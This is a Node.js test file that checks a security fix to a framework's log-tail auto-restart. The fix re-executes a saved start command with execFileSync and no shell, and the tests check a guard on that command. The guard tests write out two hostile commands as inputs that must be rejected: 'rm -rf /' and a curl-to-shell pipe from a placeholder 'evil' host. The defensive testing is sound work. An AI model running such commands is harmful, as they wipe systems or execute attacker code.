/**
 * lib/cmd/framework/tail.js — `gina tail --follow` auto-restart hardening (#SEC)
 *
 * The `--follow` mode re-runs a crashed bundle's saved start command. The bundle
 * /project identifiers feeding that lookup are parsed from log content, so:
 *   - getBundleStartingArgv rejects path traversal (covered behaviorally in
 *     test/integration/helper.test.js §12), and
 *   - tail.js re-executes the saved argv via execFileSync (argv array, no shell)
 *     instead of execSync(stringCmd), so no part of the parsed log content can be
 *     interpreted by `/bin/sh -c`.
 *
 * This suite source-pins the tail.js change and replicates the restart-arg guard
 * as pure logic (tail.js cannot be required standalone — it reads framework
 * globals like `lib`, `_`, `GINA_*`).
 */

'use strict';

var fs   = require('fs');
var path = require('path');
var { describe, it } = require('node:test');
var assert = require('node:assert/strict');

var FW       = require('../fw');
var TAIL_SRC = fs.readFileSync(path.join(FW, 'lib/cmd/framework/tail.js'), 'utf8');


// ---------------------------------------------------------------------------
// 01 — source pins
// ---------------------------------------------------------------------------

describe('01 - tail.js no-shell restart (source pins)', function () {

    it('requires execFileSync', function () {
        assert.match(TAIL_SRC, /execFileSync\s*=\s*require\('child_process'\)\.execFileSync/);
    });

    it('no longer shell-executes the restart command string', function () {
        // the prior `execSync(cmdUsedToStart)` live call must be gone
        assert.doesNotMatch(TAIL_SRC, /execSync\(cmdUsedToStart\)/);
    });

    it('re-executes the saved argv via execFileSync(binary, args[])', function () {
        assert.match(TAIL_SRC, /execFileSync\(restartArgv\[0\]/);
    });

    it('only re-execs a gina start command (bundle:start guard)', function () {
        assert.match(TAIL_SRC, /restartArgv\.indexOf\('bundle:start'\)/);
    });
});


// ---------------------------------------------------------------------------
// 02 — restart-arg guard (pure-logic replica of the tail.js block)
// ---------------------------------------------------------------------------

// Mirrors the gated exec in tail.js:
//   var restartArgv = cmdUsedToStart.split(/\s+/).filter(a => a !== '');
//   if ( restartArgv.length > 1 && restartArgv.indexOf('bundle:start') > -1 ) {
//       execFileSync(restartArgv[0], restartArgv.slice(1), ...);
//   }
function planRestart(cmd) {
    var restartArgv = ('' + cmd).split(/\s+/).filter(function (a) { return a !== ''; });
    if ( restartArgv.length > 1 && restartArgv.indexOf('bundle:start') > -1 ) {
        return { exec: true, bin: restartArgv[0], args: restartArgv.slice(1) };
    }
    return { exec: false, bin: null, args: null };
}

describe('02 - restart-arg guard (pure logic)', function () {

    it('execs a real saved start command, splitting into binary + args', function () {
        var plan = planRestart('node cli bundle:start demo @proj --env=dev');
        assert.equal(plan.exec, true);
        assert.equal(plan.bin, 'node');
        assert.deepEqual(plan.args, ['cli', 'bundle:start', 'demo', '@proj', '--env=dev']);
    });

    it('tolerates extra/leading whitespace in the saved argv', function () {
        var plan = planRestart('  node   cli  bundle:start   demo ');
        assert.equal(plan.exec, true);
        assert.equal(plan.bin, 'node');
        assert.deepEqual(plan.args, ['cli', 'bundle:start', 'demo']);
    });

    it('skips a command that is not a gina start (no bundle:start token)', function () {
        assert.equal(planRestart('rm -rf /').exec, false);
        assert.equal(planRestart('curl http://evil | sh').exec, false);
    });

    it('skips a single-token / empty command', function () {
        assert.equal(planRestart('bundle:start').exec, false); // length 1, no binary to exec
        assert.equal(planRestart('').exec, false);
        assert.equal(planRestart('   ').exec, false);
    });
});
